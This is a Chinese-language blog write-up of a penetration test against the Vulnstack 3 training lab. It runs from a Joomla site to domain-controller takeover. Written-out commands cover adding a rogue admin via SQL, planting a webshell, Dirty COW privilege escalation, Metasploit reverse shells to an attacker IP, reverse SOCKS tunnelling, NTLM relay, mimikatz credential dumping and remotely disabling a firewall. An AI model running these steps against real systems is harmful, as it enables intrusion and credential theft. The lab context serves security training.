![20210124001109.jpeg](https://image.3001.net/images/20210204/1612446174_601bf9de935cf096abaf9.jpeg!small)

## 前言

在上一节
[《记一次Vulnstack靶场内网渗透（三）》](https://www.freebuf.com/articles/network/261344.html)中，我们简单的对vulnstack
2的靶场环境做了一次测试，通过外网初探、信息收集、攻入内网最终拿下域控。在本节中，我测试的靶场是vulnstack
3这个靶场靶场地址：<http://vulnstack.qiyuanxuetang.net/vuln/detail/5/>

本次靶场渗透主要是Joomla CMS漏洞的综合渗透练习，通过信息收集、漏洞利用、权限提升、以及域渗透最终拿下域控并获得域控中的一份重要文件。

本次靶场难度适中，总最开始的信息收集到漏洞利用，最终到拿下域控之间总共花了我大约一天的时间。。。

> 文中若有不当之处，还望各位大佬多多点评。
>
> 个人博客：<https://whoamianony.top/>

### 实验环境搭建

靶机启动前需要在vmware上新添加一个VMnet2网卡，并设置如下网段为192.168.93.0/24：

![image-20210203134849448](https://image.3001.net/images/20210204/1612446175_601bf9df46486082c4835.png!small)

### 测试环境

测试环境网络拓扑图如下：

![image-20210203153304432](https://image.3001.net/images/20210204/1612446175_601bf9df99f1b17750a03.png!small)

## 外网渗透

### 外网信息收集

我们首先对已知的IP（192.168.1.110）进行端口扫描：

    
    
    nmap -T4 -sC -sV 192.168.1.110

![image-20210203153634064](https://image.3001.net/images/20210204/1612446176_601bf9e004cf3e1e26daa.png!small)

如上图所示，发现CentOS上面开放了22、80和3306端口，分别运行着OpenSSH、nginx和msyql

访问80端口，发现是一个Joomla CMS搭建的站点：

![image-20210203153717704](https://image.3001.net/images/20210204/1612446176_601bf9e06c25ee05c3320.png!small)

> Joomla是一套全球知名的内容管理系统，是使用PHP语言加上MySQL数据库所开发的软件系统，目前最新版本是3.9.24。

Kali Linux中有一个漏洞扫描器叫做JoomScan，专门用于查找Joomla中的漏洞。

输入以下命令使用JoomScan对目标网站进行扫描：

    
    
    joomscan -u http://192.168.1.110

![image-20210203153948373](https://image.3001.net/images/20210204/1612446178_601bf9e212b965d7597a6.png!small)

没有扫出什么洞来，并且发现Joomla的版本为3.9.12，版本挺新的。

扫描目录：

![image-20210203154734155](https://image.3001.net/images/20210204/1612446178_601bf9e29c23755ebdd76.png!small)

发现一个备份文件`configuration.php~`泄露，将其下载下来查看，发现数据库配置信息，有用户名和密码：testuser/cvcvgjASD!@：

![image-20210203155520582](https://image.3001.net/images/20210204/1612446179_601bf9e34295d3fcb8c9f.png!small)

接着，我们访问Joomla后台登录页面/administrator：

![image-20210203154424017](https://image.3001.net/images/20210204/1612446181_601bf9e5ecf72f3fcd63e.png!small)

尝试弱口令登录失败，也懒得爆破了，想必没有那么简单。

### 初步攻击

既然给了我们数据库的用户名和密码，应该是让我们从MySQL这里入手，我们使用Navicat远程登陆目标机的MySQL：

![image-20210203164657660](https://image.3001.net/images/20210204/1612446182_601bf9e6d7f0e89058f5e.png!small)

成功连接之后，翻了好一段时间，终于在am2zu_users表中发现了管理员账户和被加密的密码：

![image-20210203164813790](https://image.3001.net/images/20210204/1612446184_601bf9e862af0700e0b65.png!small)

这样的密码爆破是不可能了。之前在电子数据取证比赛中学到了一个思路，就是新注册一个用户，然后用我们新建的用户的密码去覆盖管理员用户的密码，这样我们就可以用自己新建的用户密码去登录管理员账号。

既然目标的数据库都拿下了，那我们便可以尝试重置管理员的密码或者直接添加一个新的超级管理员账户，在Joomla官网找到了这份文档：[《如何恢复或重置管理员密码？》](https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn)

在MySQL中输入以下命令便可成功接添加一个用户名为admin2，密码为secret的超级管理员：

    
    
    INSERT INTO `am2zu_users` (`name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`) VALUES ('Administrator2', 'admin2','d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199', '', NOW(), NOW(), NOW());  
    ​  
    INSERT INTO `am2zu_user_usergroup_map` (`user_id`,`group_id`) VALUES (LAST_INSERT_ID(),'8');

使用admin2账户成功登录后台：

![image-20210203171532548](https://image.3001.net/images/20210204/1612446187_601bf9ebf133a7698fc94.png!small)

在后台发现在前台模板功能里面可以直接编辑php文件，我们一可以直接写入webshell并连接：

![image-20210203171617261](https://image.3001.net/images/20210204/1612446189_601bf9ed10b3d9d4e7814.png!small)

进入后，选择 “Beez3 Details and Files” ，在index.php页面中写入一句话木马：

![image-20210203171945100](https://image.3001.net/images/20210204/1612446190_601bf9ee15cbbb3860bb6.png!small)

然后用蚁剑连接/templates/beez3/index.php，如下图，连接成功：

![image-20210203172544111](https://image.3001.net/images/20210204/1612446192_601bf9f025081a1ee8000.png!small)

却发现不能执行命令：

![image-20210203172718440](https://image.3001.net/images/20210204/1612446193_601bf9f100150e606fcae.png!small)

应该是设置了disable_functions，CTF中经常出这样的题。我又在模板中写了一个phpinfo，访问查看确实设置了disable_functions：

![image-20210203173041935](https://image.3001.net/images/20210204/1612446194_601bf9f205b577d4b0783.png!small)

绕过disable_functions的方法有很多，较为常见的我们可以用LD_PRELOAD绕过，需要下载一个利用脚本exploit.php：<https://github.com/MrAnonymous-1/disable_functions>

在模板编辑中新建一个文件并将利用脚本exploit.php的内容复制进去：

![image-20210203182320221](https://image.3001.net/images/20210204/1612446194_601bf9f2e3bd7d3cc1d88.png!small)

然后发送如下POST请求：

    
    
    POST: cmd=<command>  
    // <command>为你要执行的系统命令

![image-20210203182524538](https://image.3001.net/images/20210204/1612446195_601bf9f3e34345683bfd3.png!small)

成功Getshell。

蚁剑上面也有几个可以bypass disable_functions的插件，随便选择一个模式执行也可以成功绕过disable_functions：

![image-20210203184717573](https://image.3001.net/images/20210204/1612446196_601bf9f4c9254f04ea137.png!small)

接下来开始收集目标主机及其所在网络环境的信息，无非就那几个：

    
    
    uname -a    # 获取所有版本信息  
    uname -m    # 获取Linux内核架构  
    cat /proc/version    # 获取内核信息   
    cat /etc/*-release   # 发布信息  
    cat /etc/issue    # 发布信息  
    hostname    # 获取主机名  
    ​  
    cat /etc/passwd    # 列出系统所有用户   
    cat /etc/group    # 列出系统所有组   
    w    # 查看目前登录的用户  
    whoami    # 查看当前用户   
    id    # 查看当前用户信息   
    sudo -l    # 列出目前用户可执行与无法执行的指令   
    ​  
    ps aux    # 查看进程信息   
    ls -la /etc/cron*    # 查看计划任务  
    ifconfig -a    # 列出网络接口信息   
    cat /etc/network/interfaces    # 列出网络接口信息   
    arp -a    # 查看系统arp表   
    route    # 打印路由信息  
    netstat -anplt    # 打印本地端口开放信息   
    iptables -L    # 列出iptable的配置规则

![image-20210203191021813](https://image.3001.net/images/20210204/1612446197_601bf9f5df7441a9f8b98.png!small)

![image-20210203191117374](https://image.3001.net/images/20210204/1612446199_601bf9f77de6740d417ab.png!small)

可知目标主机为Ubuntu16，并且发现一个192.168.93.0/24的网段，但是该主机的IP却为192.168.93.120，是一个内网IP。有点诡异，那我们访问的192.168.1.110去哪了？现在这里留个坑。

接着，我们在/tmp/mysql目录里面发现了一个test.txt文件，在里面发现了一组用户名和密码（wwwuser/wwwuser_123Aqx）：

![image-20210203193835051](https://image.3001.net/images/20210204/1612446200_601bf9f8c6b4129278f41.png!small)

难道是ssh的凭证？但是我们之前在信息收集时并没有发现过该用户，不管了，先连连试试：

![image-20210203194317982](https://image.3001.net/images/20210204/1612446205_601bf9fd1078983991a13.png!small)

竟然连接成功了。此时我们在执行ifconfig却发现目标主机的系统版本信息和网络连接等信息全变了：

![image-20210203194736429](https://image.3001.net/images/20210204/1612446206_601bf9fe0bc25d87e8df4.png!small)

系统从原来的Ubuntu变为了CentOS，IP也变成了两个一个是我们之前访问的192.168.1.110，一个是192.168.93.0/24的网段的192.168.93.100。

看来目标网站应该是做了反向代理了，将处于内网的Ubuntu（192.168.93.120）代理到了CentOS（192.168.1.110）上。查看了CentOS上的nginx配置文件后，证实了我的猜想：

![image-20210203200115530](https://image.3001.net/images/20210204/1612446207_601bf9ff278919b314ecf.png!small)

如上图我们在CentOS的nginx配置中成功发现了nginx反向代理的标志——“proxy_pass”，这就说明CentOS（192.168.1.110）服务器上的nginx并不是用来进行web服务的，而是用来做反向代理的，我们可以看到，CentOS服务器上的nginx把收到的请求转发给了内网的服务器192.168.93.120，也就是我们之前Getshell的Ubuntu。

好了，到目前为止我们已经拿下了两台主机了：

> CentOS：192.168.1.110
>
> Ubuntu：192.168.93.120

但是权限都很低，虽然我们有了CentOS的用户名和密码，但是CentOS主机禁止了当前用户执行sudo，为了能执行更多的命令我们还需要进行提权。Ubuntu的内核比较新，所以我们主要还是考虑提权CentOS。

### 权限提升

我们使用大名鼎鼎的脏牛（CVE-2016-5195）对CentOS进行提权。

首先下载Exp：<https://github.com/FireFart/dirtycow>

编译下载的Exp：

    
    
    gcc -pthread dirty.c -o dirty -lcrypt

将编译好的漏洞利用程序上传到CentOS中一个有权限的目录，然后执行如下命令：

    
    
    ./dirty 123456  
    # ./dirty <password>

执行完成后，会在目标主机上添加一个名为firefart，密码为123456且具备root权限的用户，切换到该用户即可获得root权限，如下图所示：

![image-20210203214148796](https://image.3001.net/images/20210204/1612446208_601bfa0043ebcadf6c2b8.png!small)

## 攻入内网

为了更好的渗透内网，我要给CentOS上一个metasploit的shell：

    
    
    use exploit/multi/script/web_delivery  
    set target 6    # 选择目标系统  
    set payload linux/x64/meterpreter/reverse_tcp  
    set lhost 192.168.1.9  
    set lport 4444  
    exploit

执行后，会生成一条命令：

![image-20210203215521527](https://image.3001.net/images/20210204/1612446209_601bfa0146b6fc9b8fbf6.png!small)

将该命令再目标机CentOS上执行即可获得其meterpreter：

![image-20210203215752643](https://image.3001.net/images/20210204/1612446210_601bfa02a71ab602becaa.png!small)

### 路由转发与Socks代理

添加一个通向内网192.168.93.0/24网段的路由：

![image-20210203220401257](https://image.3001.net/images/20210204/1612446213_601bfa05245ffb28f2106.png!small)

路由转发只能将msfconsole带进内网，而要想将攻击机上的其他攻击程序也带进内网还需要搭建socks代理。我们使用earthworm搭建socks5反向代理服务。

在攻击机上执行如下：

    
    
    ./ew_for_linux64 -s rcsocks -l 1080 -e 1234

在CentOS上传ew_for_linux64，并执行如下命令：

    
    
    ./ew_for_linux64 -s rssocks -d 192.168.1.9 -e 1234

![image-20210203224720648](https://image.3001.net/images/20210204/1612446214_601bfa064b82443b26541.png!small)

然后配置proxychains，将socks5服务器指向127.0.0.1:1080：

![image-20210203224923136](https://image.3001.net/images/20210204/1612446215_601bfa07a786976eb4505.png!small)

之后便可以使用proxychains将我们的程序代理进内网了。

接着，我们使用metasploit的 auxiliary/scanner/discovery/udp_probe 模块来扫描内网主机存活：

    
    
    use auxiliary/scanner/discovery/udp_probe
    set rhosts 192.168.93.0-255
    set threads 5
    run

![image-20210203233925643](https://image.3001.net/images/20210204/1612446217_601bfa0934026280ed517.png!small)

![image-20210204023602480](https://image.3001.net/images/20210204/1612446219_601bfa0b41ac521f30194.png!small)

可知内网中除了Ubuntu以外还存在三台Windows主机，并且都在TEST域中。使用nmap进一步探测：

    
    
    proxychains4 nmap -Pn -sT -sV 192.168.93.10 192.168.93.20 192.168.93.30 -F

![image-20210204020235410](https://image.3001.net/images/20210204/1612446225_601bfa1132ada8a8d531d.png!small)

三台主机的信息如上所示，主机的系统版本、端口上运行的服务一目了然。

绘出整个网络环境的图谱图大致如下：

![image-20210203153304432](https://image.3001.net/images/20210204/1612446175_601bf9df99f1b17750a03.png!small)

## 横向移动

现在，我们就要想办法渗透内网中的那三台机子。我这里才用的是 NTLM Relay 攻击。

### NTLM Relay 攻击

大致的思路是：攻击者在CentOS上面伪造一个恶意的SMB服务器，当内网中有机器 Client1 访问这个攻击者精心构造好的SMB服务器时，
smbrelayx.py 脚本将抓到 Client1 的 Net-NTLM Hash ，然后 smbrelayx.py 用抓取到的 Client1 的
Net-NTLM Hash 重放给内网中的另一台机器 Client2。了解NTLM Relay 攻击的详情请看我的文章：[《内网渗透测试：NTLM
Relay攻击分析》](https://www.freebuf.com/articles/network/244375.html)

需要用到Impacket工具包中的smbrelayx.py工具，在CentOS上下载并安装Impacket，下载地址：<https://github.com/SecureAuthCorp/impacket>

首先，我们先生成一个正向的msf马：

    
    
    msfvenom -p windows/meterpreter/bind_tcp LHOST=192.168.1.9 LPORT=4444 -e x86/shikata_ga_nai -f exe -o shell.exe

并将新生成的木马shell.exe上传到CentOS上面。

然后进入Impacket的examples目录执行如下命令：

    
    
    ./smbrelayx.py -h 192.168.93.20 -e /root/shell.exe
    
    # 192.168.93.20 为要重放的目标主机

![image-20210204161002061](https://image.3001.net/images/20210204/1612446226_601bfa12e9d1edee3fafe.png!small)

执行后会在CentOS上面启动一个smb服务和一个http服务，http服务会跟nginx的80端口冲突，所以需要事先停止nginx 服务：`nginx
-s stop`。

此时，如果内网中的有域用户访问再次通过centos代理访问站点时，访问的就不是之前的那个Joomla站点了，而是攻击者在centos上面搭建的一个恶意的smb服务，会弹出一个认证页面：

![image-20210204161358461](https://image.3001.net/images/20210204/1612446227_601bfa13cf812b68b8a18.png!small)

安全意识差的用户自然会输入自己的域用户密码，然后smbrelayx.py就会抓取到该用户的Net-NTLM Hash并重放给内网中的另一台机器
192.168.93.20（Windows Server 2008），成功后，会在Windows Server
2008上面上传我们预先生成的木马shell.exe并执行。

由于这里是靶机，所以我手动完成该域用户的认证过程，就用Windows7上的用户访问吧。输入用户名密码后，smbrelayx.py成功抓取到该用户的Net-NTLM Hash：

![image-20210204161224186](https://image.3001.net/images/20210204/1612446229_601bfa15ee1d83375d264.png!small)

Windows Server 2008成功上线meterpreter，并且还是system权限：

![image-20210204161108544](https://image.3001.net/images/20210204/1612446231_601bfa1759f9025f930d7.png!small)

（注意这里在监听bind_tcp时一定要设置进程迁移，否则在`Removing file`的时候，会话也随之关闭了）

### 定位域管理员

拿下Windows server 2008之后，我们在Windows server
2008上传PVEFindADUser.exe工具，然后进入shell中执行如下命令：

    
    
    pvefinaduser.exe -current

如下图，成功显示域中所有计算机上当前登陆的所有用户：

![image-20210204170707015](https://image.3001.net/images/20210204/1612446232_601bfa18c0ec1d682cfc2.png!small)

可见TEST域的域管理员（test\administrator）当前登录的主机为WIN-8GA56TNV3MV.test.org，即Windows
Server 2012（192.168.93.10）。

### 抓取域用户密码

在Windows Server 2008上面列出当前进程时，发现了域管理员（TEST\administrator）的进程：

![image-20210204183309037](https://image.3001.net/images/20210204/1612446233_601bfa19da2f8439a478d.png!small)

所以我们可以在Windows server 2008上使用meterpreter上的kiwi模块抓取域用户及域管理员的密码：

    
    
    load kiwi
    kiwi_cmd privilege::debug
    kiwi_cmd sekurlsa::logonPasswords

![image-20210204163037297](https://image.3001.net/images/20210204/1612446234_601bfa1ae763e3c45f73c.png!small)

报错了，因为当前是32位的进程无法运行mimikatz，所以我们需要将当前进程迁移到一个64位的进程中。执行ps命令后随便找一个64位的进程迁移进去就行了：

![image-20210204191326339](https://image.3001.net/images/20210204/1612446237_601bfa1d5a178f260f194.png!small)

![image-20210204191437231](https://image.3001.net/images/20210204/1612446241_601bfa21af63853cb1060.png!small)

如上图，成功抓取到了Windows 2008本地的管理员用户和域管理员的密码：

> WIN2008\Administrator：123qwe!ASD
>
> TEST\administrator：zxcASDqw123!!

由于之前我们可以用Windows7上的用户Net-NTLM Hash对Windows 2008进行重放，说明Windows
7上的用户名和密码必然和Windows 2008是一样的，所以我们可以尝试直接登录：

    
    
    use exploit/windows/smb/psexec
    set rhosts 192.168.93.30
    set SMBUser administrator
    set SMBPass 123qwe!ASD
    set payload windows/meterpreter/bind_tcp
    set rhost 192.168.93.30
    run

![image-20210204165332678](https://image.3001.net/images/20210204/1612446244_601bfa240344e1888ff1d.png!small)

竟然成功了。。。

## 进攻域控

我们上面已经获得了域管理员的用户名密码了，直接登录即可：

    
    
    setg Proxies socks5:127.0.0.1:1080
    use exploit/windows/smb/psexec
    set rhosts 192.168.93.10
    set SMBDomain TEST
    set SMBUser administrator
    set SMBPass zxcASDqw123!!
    # set SMBPass fc5d63d71569f04399b419bc76e2eb34:18edd0cc3227be3bf61ce198835a1d97
    set payload windows/meterpreter/bind_tcp
    set rhost 192.168.93.10
    run

登录失败了：

![image-20210204200557814](https://image.3001.net/images/20210204/1612446245_601bfa254a3b9ec220e48.png!small)

只能用其他方法了。

重新生成一个正向的msf马bind.exe，并将bind.exe上传到Windows 2008：

![image-20210204202020352](https://image.3001.net/images/20210204/1612446246_601bfa2692d2d86acc5b3.png!small)

然后我们窃取个域管理员用户的token令牌：

    
    
    use incognito
    list_tokens -u
    impersonate_token "TEST\adminitrator"

![image-20210204201757090](https://image.3001.net/images/20210204/1612446247_601bfa27c8531a67675b2.png!small)

这样我们的当前拿下的Windows 2008便有了访问域控制器的权限：

![image-20210204201915302](https://image.3001.net/images/20210204/1612446249_601bfa2901351319a2be7.png!small)

如上图，成功列出域控制器（192.168.93.10）的C盘目录。

在C:\Users\Administrator\Documents目录里面发现了所谓的机密文件：

    
    
    dir \\192.168.93.10\C$\Users\Administrator\Documents

![image-20210204204420301](https://image.3001.net/images/20210204/1612446250_601bfa2a6f38ded387eca.png!small)

然后执行如下命令，使用sc远程在制器（192.168.93.10）上创建服务关闭防火墙：

    
    
    sc \\192.168.93.10 create unablefirewall binpath= "netsh advfirewall set allprofiles state off"
    
    sc \\192.168.93.10 start unablefirewall

![image-20210204204955511](https://image.3001.net/images/20210204/1612446251_601bfa2ba68324f73e180.png!small)

再次尝试使用 exploit/windows/smb/psexec 模块登录即可成功：

![image-20210204205515224](https://image.3001.net/images/20210204/1612446252_601bfa2ce4d21bc43c39d.png!small)

下载机密文件：

![image-20210204211126685](https://image.3001.net/images/20210204/1612446264_601bfa386b806f37d5f14.png!small)

至此，整个靶场渗透结束：

![image-20210204210510255](https://image.3001.net/images/20210204/1612446265_601bfa39b4484b8bb6d38.png!small)

## Ending......

本次靶场难度适中，总最开始的信息收集到漏洞利用，最终到拿下域控之间总共花了我大约一天的时间。。。

![muelle-en-noche-estrellada_2560x1440_xtrafondos.c](https://image.3001.net/images/20210204/1612446270_601bfa3e62458d15540f9.jpg!small)

文中若有不当之处，还望各位大佬多多点评。

个人博客：<https://whoamianony.top/>

